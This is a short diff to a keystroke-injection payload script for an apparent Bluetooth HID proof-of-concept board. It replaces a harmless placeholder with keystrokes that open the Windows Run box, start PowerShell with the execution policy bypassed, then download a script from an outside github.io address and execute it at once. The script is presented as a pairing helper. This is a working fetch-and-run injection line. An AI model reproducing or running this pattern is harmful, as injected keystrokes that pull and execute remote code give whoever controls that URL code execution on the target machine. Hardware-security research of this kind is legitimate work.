@@ -1,9 +1,6 @@
-# Windows payload (placeholder). Opens Run -> PowerShell and types a note.
-# A real Windows BLE pairing helper isn't implemented in this PoC yet.
+# Windows 11: fetch + run the PairTool Just-Works pairing helper (pair_win.ps1).
+# {MAC} = this board's BLE address, substituted at runtime.
 GUI r
-DELAY 600
-STRING powershell
-ENTER
-DELAY 1500
-STRING # PoC-KBD ({MAC}) - Windows BLE pairing bootstrap not implemented yet
+DELAY 800
+STRING powershell -NoExit -ExecutionPolicy Bypass -Command "& ([scriptblock]::Create((iwr -useb https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1).Content)) -MAC '{MAC}'"
 ENTER
